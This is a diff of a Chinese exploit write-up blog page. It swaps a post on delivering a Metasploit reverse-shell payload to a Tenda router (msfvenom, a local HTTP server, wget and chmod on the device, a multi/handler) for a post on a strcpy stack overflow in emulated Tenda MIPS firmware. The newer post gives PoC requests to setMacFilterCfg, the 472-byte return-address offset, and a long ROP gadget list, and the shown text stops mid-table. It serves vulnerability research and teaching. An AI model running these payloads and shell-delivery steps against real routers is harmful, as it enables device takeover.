@@ -6,31 +6,60 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>对tenda getshell之后的reverse_shell | ZhouYetao</title>
+  <title>对tenda(V15.03.06.42_mips)进行getshell | ZhouYetao</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="上一篇讲到成功将tenda的路由器getshell，在这篇，主要讲通过msf对其进行反弹shell">
+  <meta name="description" content="第一次对mips架构的路由器进行分析，整体来说和arm架构的差不多，但是rop利用起来要更加繁琐一点，需要利用到的软件有ida的插件mipsrop。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对tenda getshell之后的reverse_shell">
-<meta property="og:url" content="http://example.com/2021/09/19/reverse-shell/index.html">
+<meta property="og:title" content="对tenda(V15.03.06.42_mips)进行getshell">
+<meta property="og:url" content="http://example.com/2021/09/27/%E5%AF%B9tenda-V15-03-06-42-mips-%E8%BF%9B%E8%A1%8Cgetshell/index.html">
 <meta property="og:site_name" content="ZhouYetao">
-<meta property="og:description" content="上一篇讲到成功将tenda的路由器getshell，在这篇，主要讲通过msf对其进行反弹shell">
+<meta property="og:description" content="第一次对mips架构的路由器进行分析，整体来说和arm架构的差不多，但是rop利用起来要更加繁琐一点，需要利用到的软件有ida的插件mipsrop。">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/images/pasted-103.png">
-<meta property="og:image" content="http://example.com/images/pasted-104.png">
-<meta property="og:image" content="http://example.com/images/pasted-105.png">
-<meta property="og:image" content="http://example.com/images/pasted-106.png">
-<meta property="og:image" content="http://example.com/images/pasted-107.png">
-<meta property="og:image" content="http://example.com/images/pasted-109.png">
-<meta property="og:image" content="http://example.com/images/pasted-110.png">
-<meta property="og:image" content="http://example.com/images/pasted-111.png">
-<meta property="article:published_time" content="2021-09-19T15:57:00.000Z">
-<meta property="article:modified_time" content="2021-09-20T07:41:38.951Z">
+<meta property="og:image" content="http://example.com/images/pasted-124.png">
+<meta property="og:image" content="http://example.com/images/pasted-125.png">
+<meta property="og:image" content="http://example.com/images/pasted-126.png">
+<meta property="og:image" content="http://example.com/images/pasted-128.png">
+<meta property="og:image" content="http://example.com/images/pasted-129.png">
+<meta property="og:image" content="http://example.com/images/pasted-130.png">
+<meta property="og:image" content="http://example.com/images/pasted-131.png">
+<meta property="og:image" content="http://example.com/images/pasted-133.png">
+<meta property="og:image" content="http://example.com/images/pasted-134.png">
+<meta property="og:image" content="http://example.com/images/pasted-135.png">
+<meta property="og:image" content="http://example.com/images/pasted-136.png">
+<meta property="og:image" content="http://example.com/images/pasted-137.png">
+<meta property="og:image" content="http://example.com/images/pasted-138.png">
+<meta property="og:image" content="http://example.com/images/pasted-139.png">
+<meta property="og:image" content="http://example.com/images/pasted-140.png">
+<meta property="og:image" content="http://example.com/images/pasted-141.png">
+<meta property="og:image" content="http://example.com/images/pasted-142.png">
+<meta property="og:image" content="http://example.com/images/pasted-143.png">
+<meta property="og:image" content="http://example.com/images/pasted-144.png">
+<meta property="og:image" content="http://example.com/images/pasted-145.png">
+<meta property="og:image" content="http://example.com/images/pasted-146.png">
+<meta property="og:image" content="http://example.com/images/pasted-147.png">
+<meta property="og:image" content="http://example.com/images/pasted-148.png">
+<meta property="og:image" content="http://example.com/images/pasted-149.png">
+<meta property="og:image" content="http://example.com/images/pasted-151.png">
+<meta property="og:image" content="http://example.com/images/pasted-153.png">
+<meta property="og:image" content="http://example.com/images/pasted-154.png">
+<meta property="og:image" content="http://example.com/images/pasted-155.png">
+<meta property="og:image" content="http://example.com/images/pasted-156.png">
+<meta property="og:image" content="http://example.com/images/pasted-157.png">
+<meta property="og:image" content="http://example.com/images/pasted-158.png">
+<meta property="og:image" content="http://example.com/images/pasted-159.png">
+<meta property="og:image" content="http://example.com/images/pasted-160.png">
+<meta property="og:image" content="http://example.com/images/pasted-161.png">
+<meta property="og:image" content="http://example.com/images/pasted-162.png">
+<meta property="og:image" content="http://example.com/images/pasted-163.png">
+<meta property="og:image" content="http://example.com/images/pasted-164.png">
+<meta property="og:image" content="http://example.com/images/pasted-165.png">
+<meta property="article:published_time" content="2021-09-27T08:08:00.000Z">
+<meta property="article:modified_time" content="2021-09-27T12:44:10.667Z">
 <meta property="article:author" content="ZhouYetao">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="iot">
-<meta property="article:tag" content="reverse_shell">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/pasted-103.png">
+<meta name="twitter:image" content="http://example.com/images/pasted-124.png">
   
     <link rel="alternative" href="/atom.xml" title="ZhouYetao" type="application/atom+xml">
   
@@ -167,77 +196,221 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-reverse-shell" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-对tenda-V15-03-06-42-mips-进行getshell" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      对tenda getshell之后的reverse_shell
+      对tenda(V15.03.06.42_mips)进行getshell
     </h1>
   
 
         
-        <a href="/2021/09/19/reverse-shell/" class="archive-article-date">
-  	<time datetime="2021-09-19T15:57:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-19</time>
+        <a href="/2021/09/27/%E5%AF%B9tenda-V15-03-06-42-mips-%E8%BF%9B%E8%A1%8Cgetshell/" class="archive-article-date">
+  	<time datetime="2021-09-27T08:08:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>上一篇讲到成功将tenda的路由器getshell，在这篇，主要讲通过msf对其进行反弹shell</p>
+        <p>第一次对mips架构的路由器进行分析，整体来说和arm架构的差不多，但是rop利用起来要更加繁琐一点，需要利用到的软件有ida的插件mipsrop。</p>
 <span id="more"></span>
 
-<h4 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h4><p>在上一篇文章中，虽然成功的getshell了，但是没法通过本机实现操控，所以这篇主要讲如何反弹shell。</p>
-<h4 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h4><p>本想通过bash对其进行反弹shell，但是碰到了很无语的问题：</p>
-<p><img src="/images/pasted-103.png" alt="upload successful"></p>
-<p>这边没有这个命令，所以只能另想办法，继续对环境进行测试其他的命令：</p>
-<p><img src="/images/pasted-104.png" alt="upload successful"></p>
-<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>发现可以使用chmod、wget命令，这个时候，就有了利用的思路：</p>
-<p>1、首先利用msf生成基于armle的反弹shell木马；</p>
-<p>2、通过远程命令执行，通过wget下载该木马；</p>
-<p>3、执行木马，利用msf来接收。</p>
-<h5 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h5><p>需要下载msf，ubuntu直接下载可能会出现问题，我采用的是这种方法：</p>
-<p>首先进入<a target="_blank" rel="noopener" href="https://apt.metasploit.com/%EF%BC%8C%E6%8B%89%E5%88%B0%E6%9C%80%E4%BD%8E%EF%BC%8C%E4%B8%8B%E8%BD%BD.deb%E6%96%87%E4%BB%B6%EF%BC%8C%E9%9A%8F%E5%90%8E%E8%BF%9B%E5%85%A5%E5%88%B0%E8%AF%A5%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD%EF%BC%8C%E6%89%A7%E8%A1%8C">https://apt.metasploit.com/，拉到最低，下载.deb文件，随后进入到该文件的文件夹中，执行</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i + xxx.deb</span><br></pre></td></tr></table></figure>
-<p>然后输入msfconsole之后，如果出现以下界面，那么说明安装成功：</p>
-<p><img src="/images/pasted-105.png" alt="upload successful"></p>
-<p>附上msf的更新命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfupdate</span><br></pre></td></tr></table></figure>
+<h4 id="mips架构简介"><a href="#mips架构简介" class="headerlink" title="mips架构简介"></a>mips架构简介</h4><h5 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h5><table>
+<thead>
+<tr>
+<th>寄存器</th>
+<th>名字</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>$zero</td>
+<td>常量0(constant value 0)</td>
+</tr>
+<tr>
+<td>$1</td>
+<td>$at</td>
+<td>保留给汇编器(Reserved for assembler)</td>
+</tr>
+<tr>
+<td>$2-$3</td>
+<td>$v0-$v1</td>
+<td>函数调用返回值(values for results and expression evaluation)</td>
+</tr>
+<tr>
+<td>$4-$7</td>
+<td>$a0-$a3</td>
+<td>函数调用参数(arguments)</td>
+</tr>
+<tr>
+<td>$8-$15</td>
+<td>$t0-$t7</td>
+<td>暂时的(或随便用的)</td>
+</tr>
+<tr>
+<td>$16-$23</td>
+<td>$s0-$s7</td>
+<td>保存的(或如果用，需要SAVE/RESTORE的)(saved)</td>
+</tr>
+<tr>
+<td>$24-$25</td>
+<td>$t8-$t9</td>
+<td>暂时的(或随便用的)</td>
+</tr>
+<tr>
+<td>$28</td>
+<td>$gp</td>
+<td>全局指针(Global Pointer)</td>
+</tr>
+<tr>
+<td>$29</td>
+<td>$sp</td>
+<td>堆栈指针(Stack Pointer)</td>
+</tr>
+<tr>
+<td>$30</td>
+<td>$fp</td>
+<td>帧指针(Frame Pointer)</td>
+</tr>
+<tr>
+<td>$31</td>
+<td>$ra</td>
+<td>返回地址(return address)</td>
+</tr>
+</tbody></table>
+<p>以上即为在mips架构中用到的寄存器以及寄存器的作用。这边重点讲一下$ra、$a0这两个寄存器，因为$ra寄存器为函数的返回地址，进行栈溢出时需要对函数返回地址进行覆盖；$a0这个寄存器存放的数据为函数的第一个参数，例如在函数system(“/bin/sh”)中，$a0寄存器存放的值即为”/bin/sh”，这给我们在gadget构造中具有指向作用。</p>
+<h5 id="常见指令汇总"><a href="#常见指令汇总" class="headerlink" title="常见指令汇总"></a>常见指令汇总</h5><p>|助记符|指令格式|指令功能|实例|<br>|—-|—-|—-|<br>|LW|LW rt , offset (base)|加载字|LW v0 ,6 (a1)|<br>|JR|JR R1|跳转|JR $ra|<br>|BEQZ|BEQZ R1|条件转移指令，当寄存器中内容为0时转移发生|BEQZ ADD|<br>|BENZ|BENZ R1|条件转移指令，当寄存器中内容不为0时转移发生|BENZ ADD|</p>
+<h4 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h4><h5 id="程序patch"><a href="#程序patch" class="headerlink" title="程序patch"></a>程序patch</h5><p>和所有的tenda固件一样，该固件也需要进行patch以便运行，首先找到main函数：</p>
+<p><img src="/images/pasted-124.png" alt="upload successful"></p>
+<p>与arm架构不同的是这里一共有三处需要进行patch，为了更好地讲解，tab查看伪代码：</p>
+<p><img src="/images/pasted-125.png" alt="upload successful"></p>
+<p>这边一共有三处if语句，都必须符合才可以让程序跑起来，具体patch完的程序如下：</p>
+<p><img src="/images/pasted-126.png" alt="upload successful"></p>
+<p>开始运行之前需要在将qemu-mipsel-static复制到固件模拟根目录下，运行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp $(which qemu-mipsel-static) .</span><br><span class="line">sudo chroot ./ ./qemu-mipsel-static ./bin/httpd</span><br></pre></td></tr></table></figure>
 
-<p>随后推出msf，运用msfvenom命令生成木马：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/armle/shell/reverse_tcp LHOST=192.168.5.5 LPORT=4444 -f elf &gt; payload.elf</span><br></pre></td></tr></table></figure>
-<p>这是，执行该命令的目录下会多一个名为payload.elf的文件。</p>
-<h5 id="配置本地http-server"><a href="#配置本地http-server" class="headerlink" title="配置本地http.server"></a>配置本地http.server</h5><p>在包含payload.elf文件的文件夹中，输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-128.png" alt="upload successful"></p>
+<p>这里两处提示无法创建文件，查看proc目录下，发现为空，根据提示创建文件即可，创建完文件夹之后，再次运行，发现可以正常运行：</p>
+<p><img src="/images/pasted-129.png" alt="upload successful"></p>
+<h5 id="漏洞函数分析"><a href="#漏洞函数分析" class="headerlink" title="漏洞函数分析"></a>漏洞函数分析</h5><p>直接贴出漏洞存在的函数，采用倒序分析法进行分析：</p>
+<p><img src="/images/pasted-130.png" alt="upload successful"></p>
+<p>由于在这strcpy函数中，并未对字符串进行检查，可以导致栈溢出，具体的漏洞分析方法，参考该文章：</p>
+<p><a target="_blank" rel="noopener" href="https://serverless-page-bucket-06marb3t-1307447010.cos-website.ap-hongkong.myqcloud.com/2021/09/22/tenda%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84getshll/#more">https://serverless-page-bucket-06marb3t-1307447010.cos-website.ap-hongkong.myqcloud.com/2021/09/22/tenda%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84getshll/#more</a></p>
+<h5 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h5><p>这一步原以为和arm架构的一样时，出现了问题，贴出我第一次用于触发漏洞的poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.5.6/goform/setMacFilterCfg&quot;</span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;:&quot;\r&quot; +  &quot;A&quot; * 500&#125;</span><br><span class="line">requests.post(url, cookies=cookie, data=data)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/pasted-106.png" alt="upload successful"></p>
-<p>这时候，就可以通过wget下载该文件目录下的文件了。</p>
-<h5 id="wget下载木马"><a href="#wget下载木马" class="headerlink" title="wget下载木马"></a>wget下载木马</h5><p><img src="/images/pasted-107.png" alt="upload successful"></p>
-<p>这边成功下载payload.elf，但是这里一定要注意在wget的时候一定要加上http://头，以及输正确8000端口号。</p>
-<p>下载完毕之后，一定要记得通过chmod给文件加上运行权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x *</span><br></pre></td></tr></table></figure>
+<p>然后使用gdb-multiarch进行调试：</p>
+<p><img src="/images/pasted-131.png" alt="upload successful"></p>
+<p>发现程序并没有按照预期那样的被“AAAA”覆盖掉了返回地址，而是跑到了strlen函数中，最终停了下来，这是个非预期的错误，所以果断开始进行动态调试。在动态调试之前介绍一下strcpy这个函数的特点，这个函数的特点就是在遇到”\x00”会被截断，所以在构造payload的时候一定要注意payload中绝不可以有”\x00”这一字节。</p>
+<p>在动态调试之前先进行静态分析一下：</p>
+<p><img src="/images/pasted-133.png" alt="upload successful"></p>
+<p>这边对栈溢出字符以及存放栈溢出字符串的地址进行了加载，调试的重点就是进入strcpy函数查看存放栈溢出字符串的地址里的内容：</p>
+<p><img src="/images/pasted-134.png" alt="upload successful"></p>
+<p>在jalr处下断点，运行：</p>
+<p><img src="/images/pasted-135.png" alt="upload successful"></p>
+<p>然后输入si命令，进入到strcpy函数中，disassemble命令查看该段汇编指令：</p>
+<p><img src="/images/pasted-136.png" alt="upload successful"></p>
+<p>关键函数在于这三行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7f561230 &lt;+16&gt;:	lbu	a0,0(a1)</span><br><span class="line">0x7f561234 &lt;+20&gt;:	addiu	a1,a1,1</span><br><span class="line">0x7f561238 &lt;+24&gt;:	bnez	a0,0x7f56122c &lt;strcpy+12&gt;</span><br></pre></td></tr></table></figure>
+<p>这三行进行了copy的操作，断点下在0x7f561238：</p>
+<p><img src="/images/pasted-137.png" alt="upload successful"></p>
+<p>继续运行：</p>
+<p><img src="/images/pasted-138.png" alt="upload successful"></p>
+<p>这样就完成了对第一个字符的strcpy，输入命令si，继续运行：</p>
+<p><img src="/images/pasted-139.png" alt="upload successful"></p>
+<p>发现这边是将溢出字符放入到了$v1中，通过”x/x $v1”命令查看内存中的内容：</p>
+<p><img src="/images/pasted-140.png" alt="upload successful"></p>
+<p>发现已经成功复制进去了第一个字符，通过”x/160wx $v1”命令查看内存中更多的内容：</p>
+<p><img src="/images/pasted-141.png" alt="upload successful"></p>
+<p>由于$v1寄存器的值会加一，所以这里设置一个base地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set $base = $v1</span><br></pre></td></tr></table></figure>
+<p>这样就可以通过命令”x/160wx $base”查看内存中的内容：</p>
+<p><img src="/images/pasted-142.png" alt="upload successful"></p>
+<p>通过观察$base中的地址，在这个地方发现了return地址：</p>
+<p><img src="/images/pasted-143.png" alt="upload successful"></p>
+<p>这个其实就是pwn3的地址，如果这里有不理解的话，可以进行静态调试，打开pwn3函数：</p>
+<p><img src="/images/pasted-144.png" alt="upload successful"></p>
+<p>在pwn3函数中引用了pwn2函数，在pwn2函数中又引用了pwn1函数，在pwn1函数执行完之后会重新跳转到pwn2函数中，执行完之后又会继续跳转到pwn3函数中，所以这里保存了要继续跳转到pwn3中的地址，查看汇编后发现，的确如此，保存的地址为调用pwn2之后的第二句汇编指令的地址（因为第一句是nop）：</p>
+<p><img src="/images/pasted-145.png" alt="upload successful"></p>
+<p>至此，找到了溢出的大小：0x7ffff0cc - 0x7fffeef4 = 0x1d8 = 472。</p>
+<p>验证溢出字符长度，修改poc为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.5.6/goform/setMacFilterCfg&quot;</span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;:&quot;\r&quot; +  &quot;A&quot; * 472 + &quot;BBBB&quot;&#125;</span><br><span class="line">requests.post(url, cookies=cookie, data=data)</span><br></pre></td></tr></table></figure>
 
-<p>然后新开起一个终端，输入msfconsole打开msf，先进行配置：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/armle/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.5.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>再次发送poc：</p>
+<p><img src="/images/pasted-146.png" alt="upload successful"></p>
+<p>符合poc中”BBBB”，说明覆盖返回地址成功。这里埋下一个伏笔，暂时就为什么多覆盖之后会报错卖个关子。</p>
+<h5 id="gadget利用思路"><a href="#gadget利用思路" class="headerlink" title="gadget利用思路"></a>gadget利用思路</h5><p>在讲解mips gadget之前，一定要介绍一款插件，就是ida的mipsrop，这款可以很好地寻找mips中的gadget，ROPgadget对于mips来说支持度不是特别高。这里就mipsrop如何安装不做过多的赘述。</p>
+<p>在通过mipsrop寻找gadget之前，介绍几个常见的gadget，在libc中，scandir和scandir64函数的末尾有大量的lw处理：</p>
+<p><img src="/images/pasted-147.png" alt="upload successful"></p>
+<p>这个gadget的好处在于可以控制$ra，这样就可以控制跳转函数了，这里的利用思路为，将$ra覆盖为第二个gadget，在$sXX寄存中分别覆盖system地址和binsh的地址，然后跳转至gadget2中，将binsh的地址传给$a0，随后跳转至system函数，即可完成getshell。这里，我们确定一个传参给$a0的寄存器，我选择的是$s1，则直接搜索：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.find(&quot;move $a0 $s1&quot;)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">|  Address     |  Action         |  Control Jump             |</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">|  0x0000AB9C  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x0000ABA4  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x0000F54C  |  move $a0,$s1   |  jalr  $s6                |</span><br><span class="line">|  0x00011ABC  |  move $a0,$s1   |  jalr  $s4                |</span><br><span class="line">|  0x0001822C  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00018234  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x000183B8  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x000183C0  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x00019080  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00019088  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x0001920C  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x00019214  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x0001C48C  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x0001C4B8  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00022690  |  move $a0,$s1   |  jalr  $a2                |</span><br><span class="line">|  0x0002605C  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x0002A868  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x0002D4EC  |  move $a0,$s1   |  jalr  $s6                |</span><br><span class="line">|  0x0002D9B0  |  move $a0,$s1   |  jalr  $s6                |</span><br><span class="line">|  0x0002E510  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x0002FB28  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x0002FB68  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x00031EA4  |  move $a0,$s1   |  jalr  $s0                |</span><br><span class="line">|  0x0003751C  |  move $a0,$s1   |  jalr  $s4                |</span><br><span class="line">|  0x00037608  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x00037628  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x000376BC  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x00037700  |  move $a0,$s1   |  jalr  $fp                |</span><br><span class="line">|  0x0003787C  |  move $a0,$s1   |  jalr  $s6                |</span><br><span class="line">|  0x00037964  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x00037A2C  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x0003E8F8  |  move $a0,$s1   |  jalr  $s4                |</span><br><span class="line">|  0x0003E918  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x0003FE24  |  move $a0,$s1   |  jalr  $s4                |</span><br><span class="line">|  0x0003FE44  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x00040A08  |  move $a0,$s1   |  jalr  $s6                |</span><br><span class="line">|  0x00040D90  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00040DA4  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00043BFC  |  move $a0,$s1   |  jalr  $s7                |</span><br><span class="line">|  0x00043C10  |  move $a0,$s1   |  jalr  $s6                |</span><br><span class="line">|  0x00043C4C  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00043C68  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x000448CC  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x00045C6C  |  move $a0,$s1   |  jalr  $s7                |</span><br><span class="line">|  0x00045E68  |  move $a0,$s1   |  jalr  $fp                |</span><br><span class="line">|  0x00046514  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00046550  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00046578  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00046590  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x000465A8  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x000465C4  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x000465DC  |  move $a0,$s1   |  jr    $s2                |</span><br><span class="line">|  0x00046830  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00046848  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00046860  |  move $a0,$s1   |  jr    $s2                |</span><br><span class="line">|  0x00046900  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00046B24  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00046B3C  |  move $a0,$s1   |  jr    $s2                |</span><br><span class="line">|  0x000479AC  |  move $a0,$s1   |  jalr  $fp                |</span><br><span class="line">|  0x00048C60  |  move $a0,$s1   |  jr    $s0                |</span><br><span class="line">|  0x0004AF48  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x0004CD78  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x00052670  |  move $a0,$s1   |  jalr  $s5                |</span><br><span class="line">|  0x000532D8  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x000554C4  |  move $a0,$s1   |  jalr  $s4                |</span><br><span class="line">|  0x00055DC0  |  move $a0,$s1   |  jalr  $s2                |</span><br><span class="line">|  0x00055E20  |  move $a0,$s1   |  jalr  $s3                |</span><br><span class="line">|  0x00056068  |  move $a0,$s1   |  jalr  $s0                |</span><br><span class="line">|  0x0005D670  |  move $a0,$s1   |  jalr  $s6                |</span><br><span class="line">|  0x0005D700  |  move $a0,$s1   |  jalr  $s7                |</span><br><span class="line">|  0x0005D8C0  |  move $a0,$s1   |  jalr  $s6                |</span><br><span class="line">|  0x00013B68  |  move $a0,$s1   |  jr    0x24+var_s10($sp)  |</span><br><span class="line">|  0x00022600  |  move $a0,$s1   |  jr    0x24+var_s8($sp)   |</span><br><span class="line">|  0x0002DA44  |  move $a0,$s1   |  jr    0xA8+var_s24($sp)  |</span><br><span class="line">|  0x00031ECC  |  move $a0,$s1   |  jr    0x30+var_s14($sp)  |</span><br><span class="line">|  0x00040DE0  |  move $a0,$s1   |  jr    0x30+var_sC($sp)   |</span><br><span class="line">|  0x000415E0  |  move $a0,$s1   |  jr    0x30+var_s14($sp)  |</span><br><span class="line">|  0x000430EC  |  move $a0,$s1   |  jr    0x60+var_s24($sp)  |</span><br><span class="line">|  0x0004DCB8  |  move $a0,$s1   |  jr    0x58+var_s24($sp)  |</span><br><span class="line">|  0x00059FA0  |  move $a0,$s1   |  jr    0x24+var_s18($sp)  |</span><br><span class="line">|  